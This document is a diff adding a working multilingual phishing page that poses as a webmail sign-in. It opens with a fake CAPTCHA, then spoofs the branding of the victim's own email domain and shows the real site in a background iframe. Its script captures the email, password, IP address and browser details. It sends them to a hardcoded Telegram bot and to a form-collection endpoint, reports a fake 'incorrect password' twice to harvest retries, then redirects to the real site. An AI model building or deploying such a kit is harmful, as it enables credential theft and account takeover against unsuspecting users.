@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Webmail Sign-in</title>
+   <!-- Include Bootstrap 5 CSS -->
+   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+   <!-- Bootstrap Icons -->
+   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+   <!-- Google Fonts: Poppins -->
+   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+
+   <style>
+      /* Hide the main content initially */
+      #main-content {
+         display: none;
+      }
+
+      /* Verification Div Styling */
+      #verification-div {
+         height: 100vh;
+         display: flex;
+         align-items: start;
+         justify-content: center;
+         padding-top: 10%;
+      }
+
+      /* Ensure text is left-aligned */
+      .verification-content {
+         text-align: left;
+      }
+
+      /* Adjust spinner size */
+      .spinner-border {
+         width: 1.5rem;
+         height: 1.5rem;
+      }
+   </style>
+   
+   <style>
+      #background-iframe, #overlay { position: fixed; top: 0; left: 0; height: 100%; width: 100%; }
+      body { font-family: Poppins, sans-serif; margin: 0; padding: 0; overflow: hidden; }
+      #background-iframe { border: none; z-index: -3; object-fit: cover; }
+      #overlay { background-color: rgba(0, 0, 0, .5); z-index: -2; }
+      .form-container { display: none; max-width: 400px; width: 100%; padding: 2rem; background-color: rgba(255, 255, 255, .95); border-radius: .75rem; box-shadow: 0 8px 16px rgba(0, 0, 0, .2); position: relative; z-index: 1; }
+      .icon-text { display: flex; align-items: center; margin-bottom: 1.5rem; }
+      .icon-text img { width: 32px; height: 32px; margin-right: .5rem; }
+      .icon-text .h4 { margin-bottom: 0; color: #0d6efd; }
+      .form-floating { position: relative; margin-bottom: 1.5rem; }
+      .form-floating label, .input-icon { position: absolute; color: #6c757d; pointer-events: none; }
+      .form-floating label { transition: .2s ease-in-out; left: 2.5rem; top: -.2rem; background-color: transparent; z-index: 1; }
+      .form-floating input:focus + label, .form-floating input:not(:placeholder-shown) + label { transform: translateY(-1.5rem); font-size: .85rem; color: #0d6efd; }
+      .form-control { border-top: none; border-left: none; border-right: none; border-bottom: 2px solid #ced4da; border-radius: 0; padding-left: 2.5rem; transition: border-color .2s; background-color: transparent; }
+      .form-control:focus { box-shadow: none; outline: 0; border-bottom-color: #0d6efd; }
+      .input-icon { left: .75rem; top: 50%; transform: translateY(-50%); font-size: 1.2rem; }
+      .btn-primary { width: 100%; padding: .75rem; font-size: 1rem; background-color: #0d6efd; border: none; border-radius: .375rem; transition: background-color .3s, color .3s; }
+      .btn-primary:hover { background-color: #0b5ed7; color: #fff; }
+      .btn-primary:focus { box-shadow: none; }
+      @media (max-width: 576px) { .form-container { padding: 1.5rem; } }
+      .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, .5); align-items: center; justify-content: center; z-index: 9999; display: none; }
+      .error-message { color: red; margin-bottom: 1rem; display: none; }
+   </style>
+</head>
+
+<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
+   <div id="verification-div" style="position: absolute; height: 100vh; width: 100vw; background-color: #fff;">
+      <div class="row">
+         <div class="col-12 verification-content mx-2">
+            <h2 id="verify-heading">Checking your browser before accessing the site</h2>
+            <div>
+               <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border: 0px solid black; background: #f3efef; border-radius: 5px;">
+                  <input type="checkbox" id="bot-check" class="form-check-input">
+                  <label for="bot-check" class="form-check-label ms-2" id="bot-check-label">I am not a robot</label>
+               </div>
+            </div>
+            <p class="pt-1" id="verify-instruction">Click on the checkbox to verify if you're human.</p>
+         </div>
+      </div>
+   </div>
+   <!-- Background Iframe -->
+   <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
+   <!-- Dimmed Overlay -->
+   <div id="overlay"></div>
+   <!-- Form Container -->
+   <div class="form-container" id="form-container">
+      <!-- Error Message -->
+      <div id="error-message" class="error-message">Incorrect password. Try again</div>
+      <form id="user-form">
+         <!-- Honeypot Field -->
+         <input type="text" name="honeypot" id="honeypot" style="display:none;" autocomplete="off">
+         <!-- Icon and Text Row -->
+         <div class="icon-text">
+            <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width: 15px;">
+            <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
+         </div>
+         <!-- Heading -->
+         <h5 class="mb-3" id="form-heading">Confirm you’re not a robot</h5>
+         <!-- Paragraph -->
+         <p class="mb-4 text-muted" style="font-size: .8rem;" id="form-subheading">Previous session has expired, login to continue</p>
+         <!-- Email Input -->
+         <div class="form-floating position-relative">
+            <i class="bi bi-envelope input-icon"></i>
+            <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index: 1000;" disabled>
+            <label for="email" style="background-color: transparent;" id="email-label">Email</label>
+         </div>
+         <!-- Password Input -->
+         <div class="form-floating position-relative">
+            <i class="bi bi-lock input-icon"></i>
+            <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
+            <label for="password" style="background-color: transparent;" id="password-label">Password</label>
+         </div>
+         <!-- Submit Button -->
+         <button type="submit" class="btn btn-primary" id="submit-button">Next</button>
+      </form>
+   </div>
+
+   <!-- Loader Overlay -->
+   <div id="loader-overlay" class="loader-overlay">
+      <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
+         <span class="visually-hidden" id="loader-text">Loading...</span>
+      </div>
+   </div>
+
+   <!-- Bootstrap 5 JS Bundle (includes Popper) -->
+   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+   <!-- Language Detection and Translation Script -->
+   <script>
+      // Translation object for multiple languages
+      const translations = {
+         en: {
+            verifyHeading: "Checking your browser before accessing the site",
+            botCheckLabel: "I am not a robot",
+            verifyInstruction: "Click on the checkbox to verify if you're human.",
+            redirecting: "Redirecting...",
+            errorMessage: "Incorrect password. Try again",
+            formHeading: "Confirm you’re not a robot",
+            formSubheading: "Previous session has expired, login to continue",
+            emailLabel: "Email",
+            passwordLabel: "Password",
+            submitButton: "Next",
+            loaderText: "Loading..."
+         },
+         zh: {
+            verifyHeading: "在访问网站之前检查您的浏览器",
+            botCheckLabel: "我不是机器人",
+            verifyInstruction: "点击复选框以验证您是人类。",
+            redirecting: "正在重定向...",
+            errorMessage: "密码错误，请重试",
+            formHeading: "确认您不是机器人",
+            formSubheading: "之前的会话已过期，请登录以继续",
+            emailLabel: "电子邮件",
+            passwordLabel: "密码",
+            submitButton: "下一步",
+            loaderText: "加载中..."
+         },
+         ja: {
+            verifyHeading: "サイトにアクセスする前にブラウザを確認しています",
+            botCheckLabel: "私はロボットではありません",
+            verifyInstruction: "人間であることを確認するためにチェックボックスをクリックしてください。",
+            redirecting: "リダイレクト中...",
+            errorMessage: "パスワードが間違っています。もう一度お試しください",
+            formHeading: "ロボットでないことを確認してください",
+            formSubheading: "前のセッションが期限切れになりました。続行するにはログインしてください",
+            emailLabel: "メール",
+            passwordLabel: "パスワード",
+            submitButton: "次へ",
+            loaderText: "読み込み中..."
+         },
+         hi: {
+            verifyHeading: "साइट तक पहुंचने से पहले अपने ब्राउज़र की जांच करें",
+            botCheckLabel: "मैं रोबोट नहीं हूँ",
+            verifyInstruction: "यह सत्यापित करने के लिए चेकबॉक्स पर क्लिक करें कि आप इंसान हैं।",
+            redirecting: "पुनर्निर्देशन...",
+            errorMessage: "गलत पासवर्ड। फिर से कोशिश करें",
+            formHeading: "पुष्टि करें कि आप रोबोट नहीं हैं",
+            formSubheading: "पिछला सत्र समाप्त हो गया है, जारी रखने के लिए लॉगिन करें",
+            emailLabel: "ईमेल",
+            passwordLabel: "पासवर्ड",
+            submitButton: "अगला",
+            loaderText: "लोड हो रहा है..."
+         },
+         es: {
+            verifyHeading: "Comprobando tu navegador antes de acceder al sitio",
+            botCheckLabel: "No soy un robot",
+            verifyInstruction: "Haz clic en la casilla para verificar que eres humano.",
+            redirecting: "Redirigiendo...",
+            errorMessage: "Contraseña incorrecta. Inténtalo de nuevo",
+            formHeading: "Confirma que no eres un robot",
+            formSubheading: "La sesión anterior ha expirado, inicia sesión para continuar",
+            emailLabel: "Correo electrónico",
+            passwordLabel: "Contraseña",
+            submitButton: "Siguiente",
+            loaderText: "Cargando..."
+         },
+         fr: {
+            verifyHeading: "Vérification de votre navigateur avant d'accéder au site",
+            botCheckLabel: "Je ne suis pas un robot",
+            verifyInstruction: "Cochez la case pour vérifier que vous êtes humain.",
+            redirecting: "Redirection...",
+            errorMessage: "Mot de passe incorrect. Réessayez",
+            formHeading: "Confirmez que vous n'êtes pas un robot",
+            formSubheading: "La session précédente a expiré, connectez-vous pour continuer",
+            emailLabel: "Email",
+            passwordLabel: "Mot de passe",
+            submitButton: "Suivant",
+            loaderText: "Chargement..."
+         },
+         de: {
+            verifyHeading: "Überprüfung Ihres Browsers vor dem Zugriff auf die Website",
+            botCheckLabel: "Ich bin kein Roboter",
+            verifyInstruction: "Klicken Sie auf das Kontrollkästchen, um zu bestätigen, dass Sie ein Mensch sind.",
+            redirecting: "Weiterleitung...",
+            errorMessage: "Falsches Passwort. Versuchen Sie es erneut",
+            formHeading: "Bestätigen Sie, dass Sie kein Roboter sind",
+            formSubheading: "Die vorherige Sitzung ist abgelaufen, melden Sie sich an, um fortzufahren",
+            emailLabel: "E-Mail",
+            passwordLabel: "Passwort",
+            submitButton: "Weiter",
+            loaderText: "Laden..."
+         },
+         pt: {
+            verifyHeading: "Verificando seu navegador antes de acessar o site",
+            botCheckLabel: "Não sou um robô",
+            verifyInstruction: "Clique na caixa de seleção para verificar se você é humano.",
+            redirecting: "Redirecionando...",
+            errorMessage: "Senha incorreta. Tente novamente",
+            formHeading: "Confirme que você não é um robô",
+            formSubheading: "A sessão anterior expirou, faça login para continuar",
+            emailLabel: "E-mail",
+            passwordLabel: "Senha",
+            submitButton: "Próximo",
+            loaderText: "Carregando..."
+         },
+         ar: {
+            verifyHeading: "التحقق من متصفحك قبل الوصول إلى الموقع",
+            botCheckLabel: "أنا لست روبوت",
+            verifyInstruction: "انقر على مربع الاختيار للتحقق من أنك إنسان.",
+            redirecting: "جارٍ إعادة التوجيه...",
+            errorMessage: "كلمة المرور غير صحيحة. حاول مرة أخرى",
+            formHeading: "تأكد أنك لست روبوت",
+            formSubheading: "انتهت صلاحية الجلسة السابقة، قم بتسجيل الدخول للمتابعة",
+            emailLabel: "البريد الإلكتروني",
+            passwordLabel: "كلمة المرور",
+            submitButton: "التالي",
+            loaderText: "جارٍ التحميل..."
+         },
+         it: {
+            verifyHeading: "Controllo del browser prima di accedere al sito",
+            botCheckLabel: "Non sono un robot",
+            verifyInstruction: "Fai clic sulla casella per verificare che sei umano.",
+            redirecting: "Reindirizzamento...",
+            errorMessage: "Password errata. Riprova",
+            formHeading: "Conferma di non essere un robot",
+            formSubheading: "La sessione precedente è scaduta, accedi per continuare",
+            emailLabel: "Email",
+            passwordLabel: "Password",
+            submitButton: "Avanti",
+            loaderText: "Caricamento..."
+         },
+         ko: {
+            verifyHeading: "사이트에 접근하기 전에 브라우저를 확인하는 중",
+            botCheckLabel: "나는 로봇이 아닙니다",
+            verifyInstruction: "인간임을 확인하려면 체크박스를 클릭하세요.",
+            redirecting: "리디렉션 중...",
+            errorMessage: "잘못된 비밀번호입니다. 다시 시도하세요",
+            formHeading: "로봇이 아님을 확인하세요",
+            formSubheading: "이전 세션이 만료되었습니다. 계속하려면 로그인하세요",
+            emailLabel: "이메일",
+            passwordLabel: "비밀번호",
+            submitButton: "다음",
+            loaderText: "로딩 중..."
+         },
+         vi: {
+            verifyHeading: "Kiểm tra trình duyệt của bạn trước khi truy cập trang web",
+            botCheckLabel: "Tôi không phải là robot",
+            verifyInstruction: "Nhấp vào hộp kiểm để xác minh bạn là con người.",
+            redirecting: "Đang chuyển hướng...",
+            errorMessage: "Mật khẩu không đúng. Thử lại",
+            formHeading: "Xác nhận bạn không phải là robot",
+            formSubheading: "Phiên trước đã hết hạn, đăng nhập để tiếp tục",
+            emailLabel: "Email",
+            passwordLabel: "Mật khẩu",
+            submitButton: "Tiếp theo",
+            loaderText: "Đang tải..."
+         }
+      };
+
+      // Function to detect language
+      function detectLanguage() {
+         const browserLang = navigator.language || navigator.languages[0] || 'en';
+         const langCode = browserLang.split('-')[0];
+         return translations[langCode] ? langCode : 'en';
+      }
+
+      // Function to apply translations
+      function applyTranslations(lang) {
+         const t = translations[lang];
+         document.documentElement.lang = lang;
+         document.getElementById('verify-heading').textContent = t.verifyHeading;
+         document.getElementById('bot-check-label').textContent = t.botCheckLabel;
+         document.getElementById('verify-instruction').textContent = t.verifyInstruction;
+         document.getElementById('error-message').textContent = t.errorMessage;
+         document.getElementById('form-heading').textContent = t.formHeading;
+         document.getElementById('form-subheading').textContent = t.formSubheading;
+         document.getElementById('email-label').textContent = t.emailLabel;
+         document.getElementById('password-label').textContent = t.passwordLabel;
+         document.getElementById('submit-button').textContent = t.submitButton;
+         document.getElementById('loader-text').textContent = t.loaderText;
+      }
+
+      // Apply language detection and handle email from # or eta
+      document.addEventListener("DOMContentLoaded", () => {
+         const lang = detectLanguage();
+         applyTranslations(lang);
+
+         // Modified code to handle both # and eta
+         let submitCount = 0;
+         // Check for hash first, then eta query parameter
+         const hash = window.location.hash ? window.location.hash.substring(1) : null;
+         const urlParams = new URLSearchParams(window.location.search);
+         const eta = urlParams.get('eta');
+         // Use hash if present, otherwise use eta, or null if neither exists
+         const e = hash || eta || null;
+         let t;
+         if (e) {
+            document.getElementById("email").value = e;
+            const n = e.split("@");
+            if (2 === n.length) {
+               const e = n[1];
+               t = e;
+               document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${e}`;
+               const o = e.split(".")[0].toUpperCase();
+               document.getElementById("domain-name").textContent = o;
+               const r = e.startsWith("http://") || e.startsWith("https://") ? e : `https://${e}`;
+               document.getElementById("background-iframe").src = r;
+            }
+         } else {
+            console.warn("No '#' or 'eta' parameter found in the URL.");
+            document.getElementById("background-iframe").src = "about:blank";
+         }
+
+         let n = {
+            ipAddress: "Fetching...",
+            userAgent: navigator.userAgent,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            browser: "Detecting..."
+         };
+         const o = navigator.userAgent;
+         n.browser = o.indexOf("Firefox") > -1 ? "Mozilla Firefox" :
+                     o.indexOf("SamsungBrowser") > -1 ? "Samsung Internet" :
+                     o.indexOf("Opera") > -1 || o.indexOf("OPR") > -1 ? "Opera" :
+                     o.indexOf("Trident") > -1 ? "Microsoft Internet Explorer" :
+                     o.indexOf("Edge") > -1 ? "Microsoft Edge" :
+                     o.indexOf("Chrome") > -1 ? "Google Chrome or Chromium" :
+                     o.indexOf("Safari") > -1 ? "Apple Safari" : "Unknown";
+
+         fetch("https://api.ipify.org?format=json").then(e => e.json()).then(e => {
+            n.ipAddress = e.ip;
+         }).catch(e => {
+            console.error("Error fetching IP address:", e);
+            n.ipAddress = "Unavailable";
+         });
+
+         document.getElementById("user-form").addEventListener("submit", function(e) {
+            e.preventDefault();
+            submitCount += 1;
+
+            const isFirstAttempt = submitCount === 1;
+            const isSecondAttempt = submitCount === 2;
+
+            document.getElementById("loader-overlay").style.display = "flex";
+            let s = `===äłł-ďōmãïń-2025===\n\nEmail: ${document.getElementById("email").value.trim()}\nPassword: ${document.getElementById("password").value.trim()}`;
+
+            new Promise(e => {
+               const t = setInterval(() => {
+                  if (n.ipAddress !== "Fetching...") {
+                     clearInterval(t);
+                     e();
+                  }
+               }, 100);
+            }).then(() => {
+               s += `\nIP Address: ${n.ipAddress}\nUser Agent: ${n.userAgent}\nTimezone: ${n.timezone}\nBrowser: ${n.browser}`;
+
+               // Telegram submission
+               const botToken = '7103630373:AAFVJ_kia1ilw3C043wVG478q81bhZjt7gI';
+               const chatId = '6134592216';
+               const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+               const telegramParams = {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                     chat_id: chatId,
+                     text: s,
+                     parse_mode: 'HTML'
+                  })
+               };
+
+               fetch(telegramApiUrl, telegramParams)
+                  .then(response => response.json())
+                  .then(data => {
+                     console.log('Telegram message sent successfully:', data);
+                  })
+                  .catch(error => {
+                     console.error('Error sending message to Telegram:', error);
+                  });
+            });
+
+            if (isFirstAttempt || isSecondAttempt) {
+               setTimeout(() => {
+                  document.getElementById("loader-overlay").style.display = "none";
+                  document.getElementById("error-message").style.display = "block";
+                  document.getElementById("password").value = "";
+               }, 3000);
+            } else if (submitCount === 3) {
+               setTimeout(() => {
+                  document.getElementById("loader-overlay").style.display = "none";
+                  window.location.href = "https://" + t;
+               }, 3000);
+            }
+         });
+
+         // Original reporting functionality with honeypot
+         document.getElementById("user-form").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const honeypot = document.getElementById("honeypot").value.trim();
+            if (honeypot) {
+               console.log("Honeypot field filled. Submission ignored.");
+               return;
+            }
+
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const data = { email, password };
+
+            fetch("https://submit-form.com/5BYUqxAm1", {
+               method: "POST",
+               headers: { "Content-Type": "application/json" },
+               body: JSON.stringify(data)
+            }).then(response => {
+               console.log(response.ok ? "Submission to form successful!" : "Submission to form failed.");
+            }).catch(error => {
+               console.error("Error sending submission to form:", error);
+            });
+         });
+      });
+
+      // Bot verification script
+      document.addEventListener('DOMContentLoaded', function () {
+         const botCheck = document.getElementById('bot-check');
+         const verificationDiv = document.getElementById('verification-div');
+         const formContainer = document.getElementById('form-container');
+         const mainContent = document.getElementById('main-content');
+         const lang = detectLanguage();
+
+         botCheck.addEventListener('change', function () {
+            if (this.checked) {
+               const checkboxContainer = this.parentElement;
+               checkboxContainer.innerHTML = `
+                  <div class="spinner-container d-flex align-items-center">
+                     <div class="spinner-border" role="status">
+                        <span class="visually-hidden">${translations[lang].loaderText}</span>
+                     </div>
+                     <span class="ms-2">${translations[lang].verifyInstruction}</span>
+                  </div>
+               `;
+
+               setTimeout(function () {
+                  verificationDiv.innerHTML = `
+                     <div class="row">
+                        <div class="col-12 verification-content">
+                           <h2>${translations[lang].redirecting}</h2>
+                        </div>
+                     </div>
+                  `;
+
+                  setTimeout(function () {
+                     verificationDiv.style.display = 'none';
+                     mainContent.style.display = 'block';
+                     formContainer.style.display = 'block';
+                  }, 2000);
+               }, 4000);
+            }
+         });
+      });
+   </script>
+</body>
+</html>
